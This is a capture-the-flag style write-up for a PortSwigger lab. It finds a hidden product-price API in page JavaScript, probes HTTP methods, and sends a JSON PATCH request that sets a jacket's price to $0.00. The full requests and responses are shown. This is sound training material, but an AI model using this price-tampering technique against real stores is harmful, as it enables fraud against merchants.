@@ -1,0 +1,87 @@
+The steps below are meant to solve the following lab:
+https://portswigger.net/web-security/learning-paths/api-testing/api-testing-identifying-and-interacting-with-api-endpoints/api-testing/lab-exploiting-unused-api-endpoint
+
+
+On the main page of the lab there is a script tag that references the API.
+<script type="text/javascript" src="/resources/js/api/productPrice.js"></script>
+
+
+We can read the JavaScript program by visiting the source above.
+https://[LAB_SUB_DOMAIN].web-security-academy.net/resources/js/api/productPrice.js
+
+In the JavaScript we can find the api endpoint needed to solve this lab. 
+const loadPricing = (productId) => {
+    const url = new URL(location);
+    fetch(`//${url.host}/api/products/${encodeURIComponent(productId)}/price`)
+        .then(res => res.json())
+        .then(handleResponse(getAddToCartForm()));
+};
+
+window.onload = () => {
+    const url = new URL(location);
+    const productId = url.searchParams.get('productId');
+    if (url.pathname.startsWith("/product") && productId != null) {
+        loadPricing(productId);
+}
+
+
+The URL for the API, pulled from the above JavaScript:
+https://[LAB_SUB_DOMAIN].web-security-academy.net/api/products/${encodeURIComponent(productId)}/price
+
+
+We can replace ${encodeURIComponent(productId)} with the productId for the Leet Jacket, which is 1.
+https://[LAB_SUB_DOMAIN].web-security-academy.net/api/products/1/price
+
+
+Sending a GET request to the above URL returns a JSON string with the Leet Jacket price and a message.
+{"price":"$1337.00","message":"Buy quick, we are low on stock! 3 purchased in the last 25 minutes!"}
+
+
+Changing the method from GET to POST results in a response of 405 Method Not Allowed.  
+POST /api/products/1/price
+
+HTTP/2 405 Method Not Allowed
+Allow: GET, PATCH
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 20
+
+"Method Not Allowed"
+
+
+Trying instead with a PATCH method will result in a response of 400 Bad Request and a JSON message telling us that only JSON is supported.
+PATCH /api/products/1/price HTTP/
+
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 93
+
+{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
+
+
+Changing the content type to JSON and sending {"price": 0} will successfully change the price of the Leet Jacket to zero dollars and zero cents. 
+
+PATCH /api/products/1/price HTTP/2
+Host: [LAB_SUB_DOMAIN].web-security-academy.net
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Te: trailers
+Content-Type: application/json
+Content-Length: 17
+
+{
+	"price": 0
+}
+
+
+
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 17
+
+{"price":"$0.00"}
+
+Now the Jacket can be purchased and the lab passed.
+
